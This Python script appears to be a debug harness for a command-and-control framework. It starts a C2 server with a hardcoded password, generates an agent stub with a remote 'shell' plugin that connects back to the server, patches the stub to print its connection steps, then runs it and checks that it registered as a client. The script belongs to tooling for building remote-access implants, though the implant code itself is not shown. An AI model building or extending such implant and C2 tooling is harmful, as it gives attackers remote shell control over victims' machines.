"""Debug stub execution."""
import sys, os, threading, time, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import C2Engine
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

engine = C2Engine(password="whisper_secret_key", port=4445)
engine.set_callback("client_added", lambda cid, info: print(f"CLIENT {cid}"))
srv = threading.Thread(target=engine.start, daemon=True)
srv.start()
time.sleep(0.5)

stub = generate_stub(["shell"], "127.0.0.1", 4445, "whisper_secret_key", 1)
stub_debug = stub.replace("except: pass", "except Exception as _e: print(f'ERR: {_e}')")
stub_debug = stub_debug.replace(
    'sms(s, {"type":"init"',
    'print("CONNECTED"); sms(s, {"type":"init"'
)
stub_debug = stub_debug.replace(
    "s.connect((C2_HOST, C2_PORT))",
    'print("CONNECTING..."); s.connect((C2_HOST, C2_PORT))'
)

sp = os.path.join(os.path.dirname(__file__), "build", "_debug2.py")
os.makedirs(os.path.dirname(sp), exist_ok=True)
with open(sp, "w") as f:
    f.write(stub_debug)

proc = subprocess.Popen(
    [sys.executable, sp],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT
)
time.sleep(3)
out = proc.stdout.read(2000) if proc.stdout else b""
print(f"Agent output: {out.decode('utf-8', errors='replace')}")
alive = proc.poll() is None
print(f"Alive: {alive}, connected: {len(engine.clients)}")
proc.kill()
engine.stop()
